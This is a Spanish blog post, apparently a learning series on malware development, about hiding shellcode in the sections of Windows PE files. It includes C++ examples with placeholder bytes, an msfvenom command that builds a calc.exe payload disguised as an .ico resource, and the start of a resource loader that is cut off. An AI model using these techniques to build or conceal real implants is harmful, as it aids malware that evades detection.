<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Maldev 101 - Local Shellcode Storage - </title><meta name="author" content="">
<meta name="author-link" content="">
<meta name="description" content="Basics of Local Shellcode Storage" /><meta name="keywords" content='malware, shellcode, windows' /><meta itemprop="name" content="Maldev 101 - Local Shellcode Storage">
<meta itemprop="description" content="Basics of Local Shellcode Storage"><meta itemprop="datePublished" content="2023-06-21T13:12:15+02:00" />
<meta itemprop="dateModified" content="2023-06-21T13:12:15+02:00" />
<meta itemprop="wordCount" content="1265">
<meta itemprop="keywords" content="malware,shellcode,windows," /><meta property="og:title" content="Maldev 101 - Local Shellcode Storage" />
<meta property="og:description" content="Basics of Local Shellcode Storage" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/local-shellcode-storage/local-shellcode-storage/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-06-21T13:12:15+02:00" />
<meta property="article:modified_time" content="2023-06-21T13:12:15+02:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Maldev 101 - Local Shellcode Storage"/>
<meta name="twitter:description" content="Basics of Local Shellcode Storage"/>
<meta name="application-name" content="rottenbytes">
<meta name="apple-mobile-web-app-title" content="rottenbytes"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/posts/local-shellcode-storage/local-shellcode-storage/" /><link rel="prev" href="/posts/seal-htb/seal-htb/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "Maldev 101 - Local Shellcode Storage",
    "inLanguage": "",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "\/posts\/local-shellcode-storage\/local-shellcode-storage\/"
    },"genre": "posts","keywords": "malware, shellcode, windows","wordcount":  1265 ,
    "url": "\/posts\/local-shellcode-storage\/local-shellcode-storage\/","datePublished": "2023-06-21T13:12:15+02:00","dateModified": "2023-06-21T13:12:15+02:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "rottenbytes"
      },"description": "Basics of Local Shellcode Storage"
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title=""><span id="typeit-header-desktop" class="typeit"></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title=""><span id="typeit-header-title-mobile" class="typeit"></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Maldev 101 - Local Shellcode Storage</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      rottenbytes</span></span>
          <span class="post-category">included in <a href="/categories/malware-development/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> malware-development</a>&ensp;<a href="/categories/windows-internals/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> windows-internals</a></span></div>
      <div class="post-meta-line"><span title="published on 2023-06-21 13:12:15"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-06-21">2023-06-21</time></span>&nbsp;<span title="Updated on 2023-06-21 13:12:15"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-06-21">2023-06-21</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>1265 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="lazy" src="../assets/posts/shellcode-storage/test1.png" srcset="/../assets/posts/shellcode-storage/test1.png, ../assets/posts/shellcode-storage/test1.png 1.5x, /../assets/posts/shellcode-storage/test1.png 2x" sizes="auto" data-title="Basics of Local Shellcode Storage" data-alt="/../assets/posts/shellcode-storage/test1.png" width="1364" height="556" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#introducción">Introducción</a>
      <ul>
        <li><a href="#qué-es-una-_shellcode_">¿Qué es una <em>Shellcode</em>?</a></li>
        <li><a href="#qué-son-las-secciones">¿Qué son las secciones?</a></li>
      </ul>
    </li>
    <li><a href="#sección-data">Sección .data</a></li>
    <li><a href="#sección-rdata">Sección .rdata</a></li>
    <li><a href="#sección-text">Sección .text</a></li>
    <li><a href="#sección-rsrc">Sección .rsrc</a>
      <ul>
        <li><a href="#referencias">Referencias</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 id="introducción">Introducción</h2>
<p>En esta serie de posts iré documentando mi aprendizaje en desarrollo de <em>Malware</em>. Cualquier corrección o sugerencia es bienvenida, podéis contactarme a través de <a href="https://twitter.com/jagelit0"target="_blank" rel="external nofollow noopener noreferrer">Twitter</a>.</p>
<p>En este primer post explicaré diferentes maneras de almancenar nuestra <em>shellcode</em> de manera local, es decir, dentro de un archivo <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format"target="_blank" rel="external nofollow noopener noreferrer">PE</a>.</p>
<h3 id="qué-es-una-_shellcode_">¿Qué es una <em>Shellcode</em>?</h3>
<p>Un <em>shellcode</em> es una serie de instrucciones, aunque también puede contener datos. En el podemos establecer una conexión a un servidor, ejecutar comandos por ejemplo.</p>
<h3 id="qué-son-las-secciones">¿Qué son las secciones?</h3>
<p>Las secciones son una forma de organizar y separar los distintos tipos de datos que componen un archivo ejecutable, como el código, los datos, los recursos y la información de depuración. Cada sección tiene un propósito específico y está diseñada para contener un tipo de datos en particular. Estas secciones son necesarias para que el sistema operativo y los programas puedan cargar y ejecutar el archivo de manera eficiente y segura. Al separar los datos en secciones, se pueden aplicar diferentes permisos y protecciones a cada sección.</p>
<p>A la hora de almacenar nuestra <em>shellcode</em> dentro de un ejecutable, disponemos de cuatro secciones (por defecto, en la mayoría de ocasiones) en nuestro PE, estas son:</p>
<ul>
<li><code>.data</code>: Contiene datos inicializados y modificables durante la ejecución del programa.</li>
<li><code>.rdata</code>: Contiene datos de solo lectura, como constantes y cadenas de texto.</li>
<li><code>.text</code>: Contiene el código por el compilador.</li>
<li><code>.rsrc</code>: Contiene recursos, como iconos y audios, que se utilizan en la aplicación.</li>
</ul>
<h2 id="sección-data">Sección .data</h2>
<p>En esta sección se encuentran las variables globales y locales <strong>inicializadas</strong>. Tiene permisos de lectura (<code>R</code>) y escritura (<code>W</code>), por lo que podría ser adecuada en caso de que queramos almacenar una <em>shellcode</em> cifrada que requiera de descifrado en tiempo de ejecución.</p>
<p>Para almacenar nuestra <em>shellcode</em> en esta sección, simplemente debemos crear una variable global o local <strong>inicializada</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Shellcode_Data[] <span style="color:#f92672">=</span> {
    <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x53</span>
};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] Shellcode_Data Addr. : 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#f92672">&amp;</span>Shellcode_Data <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] Hit &lt;Enter&gt; to Exit.&#34;</span>;
    getchar();
    
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Podemos comprobar que nuestra <em>shellcode</em> ha sido guardada en la sección <code>.data</code> si abrimos nuestro ejecutable compilado en cualquier analizador de PEs. En este caso, haré uso de <a href="http://wjradburn.com/software/"target="_blank" rel="external nofollow noopener noreferrer">PEView</a>.</p>
<p>Si nos dirigimos a la sección <code>.data</code>, podemos ver que nuestra variable <code>Shellcode_Data</code> queda almacenada en dicha sección.</p>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/pe-test.png" srcset="/../assets/posts/shellcode-storage/pe-test.png, ../assets/posts/shellcode-storage/pe-test.png 1.5x, /../assets/posts/shellcode-storage/pe-test.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/pe-test.png" data-alt="/../assets/posts/shellcode-storage/pe-test.png" width="872" height="460" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<h2 id="sección-rdata">Sección .rdata</h2>
<p>A diferencia de la sección <code>.data</code>, la sección <code>.rdata</code> se diferencia en que aquí solamente se almacenarán las variables de tipo <code>const</code>, es decir, aquellas variables que no pueden ser modificadas durante la ejecución del programa (<code>rdata.</code> == <em>read only data</em>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Shellcode_Rdata[] <span style="color:#f92672">=</span> {
    <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x53</span>
};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] Shellcode_Rdata Addr. : 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#f92672">&amp;</span>Shellcode_Rdata <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] Hit &lt;Enter&gt; to Exit.&#34;</span>;
    getchar();
    
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Si volvemos a abrir nuestro ejecutable con PEView, podemos ver que la dirección de memoria de de nuestra variable <code>Shellcode_Rdata</code>, corresponde a la sección <code>.rdata</code> del mismo.</p>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/rdata1.png" srcset="/../assets/posts/shellcode-storage/rdata1.png, ../assets/posts/shellcode-storage/rdata1.png 1.5x, /../assets/posts/shellcode-storage/rdata1.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/rdata1.png" data-alt="/../assets/posts/shellcode-storage/rdata1.png" width="898" height="440" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<h2 id="sección-text">Sección .text</h2>
<p>En esta sección es donde se almacena el código ejecutable, por tanto no es necesario modificar los permisos para poder ejecutar nuestra <em>shellcode</em>.</p>
<p>La principal ventaja de almacenar nuestra <em>shellcode</em> en esta sección es que esta tiene permisos de ejecución, por lo que no es necesario de modificar los permisos para poder ejecutar nuestra <em>shellcode</em>. Cabe destacar que esta sección es útil para <em>shellcodes</em> con un tamaño aproximado de 10 bytes o menos, ya que cuanto más grande sea la <em>shellcode</em>, más difícil será encontrar suficiente espacio continuo y libre en la sección <code>.text</code> para almacenar nuestro código. Además, si la <em>shellcode</em> es demasiado grande, es posible que sea necesario modificar los permisos de la sección para poder ejecutarla (lo que dificulta la evasión).</p>
<p>Para poder almacenar nuestra <em>shellcode</em> en la sección <code>.text</code>, deberemos especificarlo en nuestro código mediante el uso de las directivas <code>#pragma section(&quot;.text&quot;)</code> y a continuación <code>__declspec(allocate(&quot;.text&quot;))</code>, como se puede ver en el siguiente ejemplo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#75715e">#pragma section(&#34;.text&#34;)
</span><span style="color:#75715e"></span><span style="color:#66d9ef">__declspec</span>(allocate(<span style="color:#e6db74">&#34;.text&#34;</span>)) <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Text_Shellcode[] <span style="color:#f92672">=</span> {
    <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x53</span>
};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] Text_Shellcode Addr. : 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#f92672">&amp;</span>Text_Shellcode <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] Hit &lt;Enter&gt; To Exit.&#34;</span>;
    getchar();
    
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Una vez más, vamos a comprobar que nuestra <em>shellcode</em> es almacenada en la sección <code>.text</code> con PEView.</p>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/pe-text-1.png" srcset="/../assets/posts/shellcode-storage/pe-text-1.png, ../assets/posts/shellcode-storage/pe-text-1.png 1.5x, /../assets/posts/shellcode-storage/pe-text-1.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/pe-text-1.png" data-alt="/../assets/posts/shellcode-storage/pe-text-1.png" width="900" height="435" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<h2 id="sección-rsrc">Sección .rsrc</h2>
<p>La sección <code>.rsrc</code> es una de las mejores opciones, ya que es en esta sección donde la mayoría de los archivos guardan sus recursos (imágenes, audio, iconos&hellip;). Además, es un método más limpio, ya que permite almacenar <em>shellcodes</em> de tamaño mucho más grande que las demás secciones.</p>
<p>Primero de todo, para generar nuestra <em>shellcode</em>, haremos uso de <a href="https://www.offsec.com/metasploit-unleashed/msfvenom/"target="_blank" rel="external nofollow noopener noreferrer">msfvenom</a>:</p>
<ul>
<li>Raw Shellcode: <code>msfvenom -p windows/x64/exec CMD=&quot;cmd.exe /c calc.exe&quot; -f raw &gt; calc.ico</code></li>
</ul>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/msfvenom.png" srcset="/../assets/posts/shellcode-storage/msfvenom.png, ../assets/posts/shellcode-storage/msfvenom.png 1.5x, /../assets/posts/shellcode-storage/msfvenom.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/msfvenom.png" data-alt="/../assets/posts/shellcode-storage/msfvenom.png" width="1427" height="826" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<p>A continuación, se muestra cómo añadir nuestro recurso a un ejecutable para que este quede almacenado en la sección <code>.rsrc</code>:</p>
<ol>
<li>Dentro de Visual Studio, hay que hacer click con el botón derecho en <em>Resource files</em> y luego clickar en <em>Add</em> &gt; <em>New Item</em>.</li>
</ol>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r1.png" srcset="/../assets/posts/shellcode-storage/r1.png, ../assets/posts/shellcode-storage/r1.png 1.5x, /../assets/posts/shellcode-storage/r1.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r1.png" data-alt="/../assets/posts/shellcode-storage/r1.png" width="681" height="386" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<ol start="2">
<li>Vamos mostrar todas la <em>Templates</em> y escoger <em>Resource File</em></li>
</ol>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r2.png" srcset="/../assets/posts/shellcode-storage/r2.png, ../assets/posts/shellcode-storage/r2.png 1.5x, /../assets/posts/shellcode-storage/r2.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r2.png" data-alt="/../assets/posts/shellcode-storage/r2.png" width="398" height="186" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r3.png" srcset="/../assets/posts/shellcode-storage/r3.png, ../assets/posts/shellcode-storage/r3.png 1.5x, /../assets/posts/shellcode-storage/r3.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r3.png" data-alt="/../assets/posts/shellcode-storage/r3.png" width="936" height="364" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r4.png" srcset="/../assets/posts/shellcode-storage/r4.png, ../assets/posts/shellcode-storage/r4.png 1.5x, /../assets/posts/shellcode-storage/r4.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r4.png" data-alt="/../assets/posts/shellcode-storage/r4.png" width="936" height="364" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<ol start="3">
<li>Esto creará la Vista de recursos. Hay que hacer click derecho en el archivo <code>.rc</code> (<code>Resource.rc</code> es el nombre predeterminado) y seleccionar la opción <em>Add Resource</em>.</li>
</ol>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r5.png" srcset="/../assets/posts/shellcode-storage/r5.png, ../assets/posts/shellcode-storage/r5.png 1.5x, /../assets/posts/shellcode-storage/r5.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r5.png" data-alt="/../assets/posts/shellcode-storage/r5.png" width="351" height="322" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<ol start="4">
<li>Debemos de darle a <em>Import</em> y seleccionar el archivo <code>calc.ico</code>, que es nuestra <em>shellcode</em> generada con msfvenom.</li>
<li>Aparecerá un mensaje solicitando el tipo de recurso. Debemos de introducir un nombre (Importante recordarlo para cuando hagamos uso de <code>FindResource</code>).</li>
</ol>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r6.png" srcset="/../assets/posts/shellcode-storage/r6.png, ../assets/posts/shellcode-storage/r6.png 1.5x, /../assets/posts/shellcode-storage/r6.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r6.png" data-alt="/../assets/posts/shellcode-storage/r6.png" width="740" height="688" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<ol start="6">
<li>Después de hacer click en aceptar, nuestra <em>shellcode</em> debe mostrarse en formato <em>raw</em> dentro de nuestro proyecto.</li>
</ol>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r7.png" srcset="/../assets/posts/shellcode-storage/r7.png, ../assets/posts/shellcode-storage/r7.png 1.5x, /../assets/posts/shellcode-storage/r7.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r7.png" data-alt="/../assets/posts/shellcode-storage/r7.png" width="1416" height="730" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<ol start="7">
<li>Dentro de <code>resource.h</code> debe estar el identificador con el nombre que le dimos a nuestro recurso. Este archivo contiene una declaración de definición que hace referencia al ID de nuestra <em>shellcode</em> (<code>IDR_RCDATA1</code>).</li>
</ol>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r8.png" srcset="/../assets/posts/shellcode-storage/r8.png, ../assets/posts/shellcode-storage/r8.png 1.5x, /../assets/posts/shellcode-storage/r8.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r8.png" data-alt="/../assets/posts/shellcode-storage/r8.png" width="995" height="559" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<p>Una vez compilado nuestro ejecutable, la <em>shellcode</em> se almacenará en la sección <code>.rsrc</code>, pero no se puede acceder a ella directamente. Para ello, se deben usar varias funciones de la API de Windows para acceder al recurso:</p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew"target="_blank" rel="external nofollow noopener noreferrer">FindResourceW</a>: Busca recursos usando un identificador y un tipo de recurso, y devuelve un identificador para acceder al contenido del recurso.</li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource"target="_blank" rel="external nofollow noopener noreferrer">LoadResource</a>: Carga un recurso en la memoria y devuelve un puntero al primer byte de la ubicación de la memoria donde se encuentra el recurso</li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource"target="_blank" rel="external nofollow noopener noreferrer">LockResource</a>: No bloquea realmente la memoria; solo se usa para obtener un puntero a la memoria que contiene los datos del recurso.</li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource"target="_blank" rel="external nofollow noopener noreferrer">SizeofResource</a>: Obtiene el tamaño del recurso especificado.</li>
</ul>
<p>A modo de ejemplo, se usarán las funciones anteriores para obtener el recurso de nuestro ejecutable, para así crear un nuevo espacio de memoria y ejecutar nuestra <em>shellcode</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;resource.h&#34;</span><span style="color:#75715e">
